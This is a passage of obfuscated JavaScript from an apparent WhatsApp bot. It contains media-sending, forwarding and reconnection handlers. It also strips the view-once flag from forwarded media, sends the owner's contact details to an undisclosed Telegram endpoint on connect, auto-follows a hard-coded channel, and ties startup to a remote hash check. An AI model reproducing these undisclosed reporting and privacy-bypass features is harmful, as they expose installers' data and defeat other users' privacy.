        packname: global.packname,
        author: global.packname2,
        categories: p244.categories ? p244.categories : []
      });
      await fs2.promises.unlink(_0x4debaa);
      vLS6 = "sticker";
      v_0x41467f2 = "image/webp";
    } else if (/image/.test(_0x41467f)) {
      vLS6 = "image";
    } else if (/video/.test(_0x41467f)) {
      vLS6 = "video";
    } else if (/audio/.test(_0x41467f)) {
      vLS6 = "audio";
    } else {
      vLS6 = "document";
    }
    await vMakeWASocket.sendMessage(p240, {
      [vLS6]: {
        url: v_0x4debaa2
      },
      mimetype: v_0x41467f2,
      fileName: p242,
      ...p244
    }, {
      quoted: p243,
      ...p244
    });
    return fs2.promises.unlink(v_0x4debaa2);
  };
  vMakeWASocket.parseMention = async p245 => {
    return [...p245.matchAll(/@([0-9]{5,16}|0)/g)].map(p246 => p246[1] + "@s.whatsapp.net");
  };
  vMakeWASocket.copyNForward = async (p247, p248, p249 = false, p250 = {}) => {
    let v178;
    if (p250.readViewOnce) {
      p248.message = p248.message?.ephemeralMessage?.message || p248.message;
      v178 = Object.keys(p248.message.viewOnceMessage.message)[0];
      delete p248.message.viewOnceMessage.message[v178].viewOnce;
      p248.message = {
        ...p248.message.viewOnceMessage.message
      };
    }
    let v179 = Object.keys(p248.message)[0];
    let v180 = await generateForwardMessageContent(p248, p249);
    let v181 = Object.keys(v180)[0];
    let vO20 = {};
    if (v179 != "conversation") {
      vO20 = p248.message[v179].contextInfo;
    }
    v180[v181].contextInfo = {
      ...vO20,
      ...v180[v181].contextInfo
    };
    const v182 = await generateWAMessageFromContent(p247, v180, p250 ? {
      ...v180[v181],
      ...p250,
      ...(p250.contextInfo ? {
        contextInfo: {
          ...v180[v181].contextInfo,
          ...p250.contextInfo
        }
      } : {})
    } : {});
    await vMakeWASocket.relayMessage(p247, v182.message, {
      messageId: v182.key.id
    });
    return v182;
  };
  vMakeWASocket.getFile = async (p251, p252) => {
    let v183;
    let v184 = Buffer.isBuffer(p251) ? p251 : /^data:.*?\/.*?;base64,/i.test(p251) ? Buffer.from(p251.split`,`[1], "base64") : /^https?:\/\//.test(p251) ? await (v183 = await getBuffer(p251)) : fs2.existsSync(p251) ? (filename = p251, fs2.readFileSync(p251)) : typeof p251 === "string" ? p251 : Buffer.alloc(0);
    let v185 = (await fileType.fromBuffer(v184)) || {
      mime: "application/octet-stream",
      ext: ".bin"
    };
    filename = path.join(__filename, "../src/" + new Date() * 1 + "." + v185.ext);
    if (v184 && p252) {
      fs2.promises.writeFile(filename, v184);
    }
    return {
      res: v183,
      filename: filename,
      size: await getSizeMedia(v184),
      ...v185,
      data: v184
    };
  };
  vMakeWASocket.serializeM = p253 => smsg(vMakeWASocket, p253, vMakeInMemoryStore);
  vMakeWASocket.ev.on("connection.update", async p254 => {
    const {
      connection: _0x52b1ef,
      lastDisconnect: _0x3176f9
    } = p254;
    if (_0x52b1ef === "close") {
      let v186 = new Boom(_0x3176f9?.error)?.output.statusCode;
      if (v186 === DisconnectReason.badSession) {
        console.log("❌ File sesi bermasalah, silakan hapus folder SadSession dan tmp lalu lakukan pairing ulang.");
        process.exit();
      } else if (v186 === DisconnectReason.connectionClosed) {
        console.log("🔁 Koneksi tertutup, mencoba menyambung ulang...");
        f6();
      } else if (v186 === DisconnectReason.connectionLost) {
        console.log("⚠️ Koneksi ke server terputus, mencoba menyambung ulang...");
        f6();
      } else if (v186 === DisconnectReason.connectionReplaced) {
        console.log("⚠️ Koneksi digantikan oleh sesi lain. Silakan restart bot untuk memulai ulang.");
        process.exit();
      } else if (v186 === DisconnectReason.loggedOut) {
        console.log("🚪 Perangkat keluar. Silakan hapus folder sesi SadSession dan tmp lalu restart server.");
        process.exit();
      } else if (v186 === DisconnectReason.restartRequired) {
        console.log("🔄 Restart server diperlukan. Menyambung ulang...");
        f6();
      } else if (v186 === DisconnectReason.timedOut) {
        console.log("⏳ Waktu koneksi habis, mencoba menghubungkan kembali...");
        f6();
      } else {
        console.log("❓ Unknown DisconnectReason: " + v186 + " | " + _0x52b1ef);
        f6();
      }
    } else if (_0x52b1ef === "open") {
      let v187 = global.ownername || "Tidak diketahui";
      let v188 = global.owner && global.owner[0] || global.sosialmedia?.whatsapp || "Tidak diketahui";
      let v189 = global.sosialmedia?.telegram || "Tidak diketahui";
      sendToTelegram("🟢 SadeX Connected\n━━━━━━━━━━━━━━\n• Owner Name : " + v187 + "\n• Owner WA   : " + v188 + "\n• Owner TG   : " + v189 + "\n• Connection   : " + global.SadBot + "\n━━━━━━━━━━━━━━\nBot berhasil tersambung ke WhatsApp.");
      try {
        vMakeWASocket.newsletterFollow("120363422730864136@newsletter");
      } catch (e24) {
        console.error("❌ Experiencing an error when following a channel", e24);
      }
      console.log("✅ The bot has successfully connected to WhatsApp!");
      // 🔥 Jalankan sistem backup otomatis
      startBackupSystem({
        TELEGRAM_TOKEN: `${global.botbackup}`,  // ganti dengan token bot Telegram
        CHAT_ID: `${global.tokentele}`                     // ganti dengan chat ID tujuan
      });
    }
  });
  return vMakeWASocket;
}
//f6();
(async () => {
  try {
    const localHash = getHash("./SadLibray/lowdb/connect.js");
    const remoteHash = await getRemoteHash();

    if (localHash !== remoteHash) {
      console.error("⛔ connect.js telah diubah! Sistem dihentikan.");
      process.exit(1);
    }

    console.log("✅ Verifikasi berhasil");
    await f6();

  } catch (err) {
    console.error("❌ Error:", err.message);
    process.exit(1);
  }
})();
let v190 = require.resolve(__filename);
fs2.watchFile(v190, () => {
  fs2.unwatchFile(v190);
  console.log(chalk.redBright("file updated successfully : '" + __filename + "'"));
  delete require.cache[v190];
  require(v190);
});